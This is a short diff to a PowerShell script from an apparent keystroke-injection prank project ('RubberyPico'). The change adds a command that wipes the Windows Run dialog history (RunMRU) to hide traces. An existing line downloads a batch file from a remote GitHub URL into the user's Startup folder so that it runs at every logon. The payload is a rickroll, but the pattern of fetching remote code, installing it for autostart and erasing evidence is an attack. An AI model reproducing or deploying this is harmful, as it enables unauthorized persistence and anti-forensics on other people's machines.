@@ -1,3 +1,6 @@
+# Delete run dialog history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
 # Download the .bat file into the autostart menu
 iwr -Uri 'https://raw.githubusercontent.com/ToastyBoiiiii/RubberyPico/main/AutoRoll/autostartRickRoll.bat' -OutFile "$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\autostartRickRoll.bat"
 
